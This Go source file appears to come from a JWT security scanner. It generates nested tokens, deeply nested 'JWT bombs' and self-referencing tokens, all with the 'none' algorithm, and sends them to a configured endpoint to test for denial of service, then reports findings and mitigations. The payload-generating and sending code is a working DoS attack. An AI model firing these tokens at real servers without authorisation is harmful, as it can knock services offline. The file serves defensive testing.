package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
)

// testNestedJWT tests nested JWT tokens and JWT bombs.
// Nested JWTs embed a JWT inside the payload of another JWT.
// JWT bombs are deeply nested tokens designed to cause resource exhaustion
// in parsers that recursively decode nested tokens.
func testNestedJWT(cfg *Config) {
	if cfg.Endpoint != "" && !confirmOnline(cfg) {
		return
	}

	header, payload, _, err := decodeTokenParts(cfg.Token)
	if err != nil {
		log.Fatalf("Failed to decode token: %v", err)
	}

	depth := cfg.NestedDepth
	if depth <= 0 {
		depth = 5
	}

	report := Report{}

	// Test 1: Single nested JWT (JWT within JWT)
	fmt.Printf("[Nested] Generating single-level nested JWT (depth=1)\n")
	nestedToken := createNestedJWT(cfg.Token, header, payload, 1)
	report.Logs = append(report.Logs, "Single nested: "+nestedToken)

	if cfg.Endpoint != "" {
		accepted, status, _ := sendTokenAndCheck(cfg, nestedToken)
		if accepted {
			fmt.Printf("[VULNERABLE] Nested JWT accepted (depth=1)! Status: %d\n", status)
			addResult(&report, VulnerabilityResult{
				Name:        "Nested JWT Processing (confirmed)",
				Category:    "Nested JWT",
				Severity:    "MEDIUM",
				Description: fmt.Sprintf("Server accepted a nested JWT (JWT inside payload). "+
					"This may indicate the server recursively processes nested tokens, which can lead to denial of service (HTTP %d).", status),
				Payload:   nestedToken,
				Confirmed: true,
				Details: map[string]string{
					"depth":       "1",
					"status_code": fmt.Sprintf("%d", status),
				},
			})
		} else {
			fmt.Printf("[SAFE] Nested JWT rejected (depth=1, status %d)\n", status)
		}
	} else {
		fmt.Printf("[Nested] Single nested token: %s\n", nestedToken)
		addResult(&report, newResult(
			"Nested JWT (offline)",
			"Nested JWT",
			"MEDIUM",
			"Generated a JWT with another JWT embedded in the payload. "+
				"If the server recursively decodes nested tokens, this can be exploited.",
		))
	}

	// Test 2: Deeply nested JWT (JWT bomb)
	bombDepth := depth
	if bombDepth > 50 {
		bombDepth = 50 // Cap to prevent excessive memory usage
	}
	fmt.Printf("[Nested] Generating JWT bomb (depth=%d)\n", bombDepth)
	bombToken := createJWTBomb(cfg.Token, header, payload, bombDepth)
	tokenSize := len(bombToken)
	fmt.Printf("[Nested] JWT bomb size: %d bytes\n", tokenSize)

	if cfg.Endpoint != "" {
		// Warn about potential DoS
		fmt.Printf("[WARNING] Sending JWT bomb to endpoint may cause DoS. Proceeding...\n")
		accepted, status, body := sendTokenAndCheck(cfg, bombToken)

		if accepted {
			fmt.Printf("[VULNERABLE] JWT bomb accepted! Server may be vulnerable to DoS. Status: %d\n", status)
			addResult(&report, VulnerabilityResult{
				Name:        "JWT Bomb / Deep Nesting (confirmed)",
				Category:    "Nested JWT",
				Severity:    "HIGH",
				Description: fmt.Sprintf("Server accepted a deeply nested JWT bomb (depth=%d, size=%d bytes). "+
					"This can cause resource exhaustion (CPU, memory) and denial of service (HTTP %d).",
					bombDepth, tokenSize, status),
				Payload:   truncate(bombToken, 500),
				Confirmed: true,
				Details: map[string]string{
					"depth":       fmt.Sprintf("%d", bombDepth),
					"size_bytes":  fmt.Sprintf("%d", tokenSize),
					"status_code": fmt.Sprintf("%d", status),
				},
			})
		} else {
			// Even if rejected, check for timeout (potential DoS via processing)
			if status == 0 || status >= 500 {
				fmt.Printf("[POTENTIALLY VULNERABLE] JWT bomb caused error/timeout (status %d)\n", status)
				addResult(&report, VulnerabilityResult{
					Name:        "JWT Bomb / Resource Exhaustion (confirmed)",
					Category:    "Nested JWT",
					Severity:    "HIGH",
					Description: fmt.Sprintf("Server returned error (HTTP %d) when processing a deeply nested JWT bomb "+
						"(depth=%d, size=%d bytes). This indicates the server attempted to process the bomb "+
						"and may be vulnerable to DoS via resource exhaustion.", status, bombDepth, tokenSize),
					Payload:   truncate(bombToken, 500),
					Confirmed: true,
					Details: map[string]string{
						"depth":       fmt.Sprintf("%d", bombDepth),
						"size_bytes":  fmt.Sprintf("%d", tokenSize),
						"status_code": fmt.Sprintf("%d", status),
						"response":    truncate(body, 200),
					},
				})
			} else {
				fmt.Printf("[SAFE] JWT bomb rejected (status %d)\n", status)
			}
		}
	} else {
		addResult(&report, VulnerabilityResult{
			Name:        "JWT Bomb (offline)",
			Category:    "Nested JWT",
			Severity:    "HIGH",
			Description: fmt.Sprintf("Generated a JWT bomb with depth=%d, size=%d bytes. "+
				"If the server recursively processes nested JWTs, this can cause resource exhaustion.", bombDepth, tokenSize),
			Payload: truncate(bombToken, 500),
			Details: map[string]string{
				"depth":      fmt.Sprintf("%d", bombDepth),
				"size_bytes": fmt.Sprintf("%d", tokenSize),
			},
		})
	}

	// Test 3: Infinite nesting via self-reference (if the server caches tokens)
	fmt.Printf("[Nested] Generating self-referencing JWT\n")
	selfRefToken := createSelfReferencingJWT(header, payload, cfg.Token)
	if cfg.Endpoint != "" {
		accepted, status, _ := sendTokenAndCheck(cfg, selfRefToken)
		if accepted {
			fmt.Printf("[VULNERABLE] Self-referencing JWT accepted! Status: %d\n", status)
			addResult(&report, VulnerabilityResult{
				Name:        "Self-Referencing JWT (confirmed)",
				Category:    "Nested JWT",
				Severity:    "MEDIUM",
				Description: fmt.Sprintf("Server accepted a self-referencing JWT (HTTP %d). "+
					"If the server caches or stores tokens, this can cause infinite loops.", status),
				Payload:   selfRefToken,
				Confirmed: true,
			})
		}
	} else {
		fmt.Printf("[Nested] Self-referencing token: %s\n", selfRefToken)
	}

	report.Recommendations = append(report.Recommendations,
		"Limit maximum JWT nesting depth (reject tokens with >1 nesting level)",
		"Set maximum token size limit (e.g., 8KB) and reject oversized tokens",
		"Do not recursively decode JWT payloads that contain JWT strings",
		"Implement timeout on token processing to prevent resource exhaustion",
		"Use iterative (non-recursive) JWT parsing to avoid stack overflow",
	)
	writeReport(cfg.ReportFile, report)
}

// createNestedJWT creates a JWT with another JWT embedded in the payload.
func createNestedJWT(innerToken string, header, payload map[string]interface{}, depth int) string {
	headerCopy := copyHeader(header)
	headerCopy["alg"] = "none"
	headerCopy["typ"] = "JWT"
	headerCopy["nested"] = true

	payloadCopy := copyHeader(payload)
	payloadCopy["jwt"] = innerToken
	payloadCopy["nesting_depth"] = depth

	headerEnc, _ := encodeTokenPart(headerCopy)
	payloadEnc, _ := encodeTokenPart(payloadCopy)

	return headerEnc + "." + payloadEnc + "."
}

// createJWTBomb creates a deeply nested JWT bomb.
func createJWTBomb(originalToken string, header, payload map[string]interface{}, depth int) string {
	// Start with the innermost token
	currentToken := originalToken

	for i := 0; i < depth; i++ {
		headerCopy := copyHeader(header)
		headerCopy["alg"] = "none"
		headerCopy["typ"] = "JWT"
		headerCopy["nested"] = true

		payloadCopy := copyHeader(payload)
		payloadCopy["jwt"] = currentToken
		payloadCopy["nesting_depth"] = i + 1

		headerEnc, _ := encodeTokenPart(headerCopy)
		payloadEnc, _ := encodeTokenPart(payloadCopy)

		currentToken = headerEnc + "." + payloadEnc + "."
	}

	return currentToken
}

// createSelfReferencingJWT creates a JWT whose payload contains the token itself.
func createSelfReferencingJWT(header, payload map[string]interface{}, originalToken string) string {
	headerCopy := copyHeader(header)
	headerCopy["alg"] = "none"

	// Create a payload that references itself
	payloadCopy := copyHeader(payload)
	payloadCopy["self_ref"] = "PLACEHOLDER"
	payloadCopy["original"] = originalToken[:min(100, len(originalToken))]

	headerEnc, _ := encodeTokenPart(headerCopy)
	payloadEnc, _ := encodeTokenPart(payloadCopy)

	token := headerEnc + "." + payloadEnc + "."

	// Replace placeholder with the token itself (creates a self-reference)
	payloadBytes, _ := base64.RawURLEncoding.DecodeString(payloadEnc)
	var payloadMap map[string]interface{}
	json.Unmarshal(payloadBytes, &payloadMap)
	payloadMap["self_ref"] = token

	payloadEnc2, _ := encodeTokenPart(payloadMap)
	token = headerEnc + "." + payloadEnc2 + "."

	return token
}

// Note: min/max are built-in in Go 1.21+ (go.mod specifies 1.26.1)
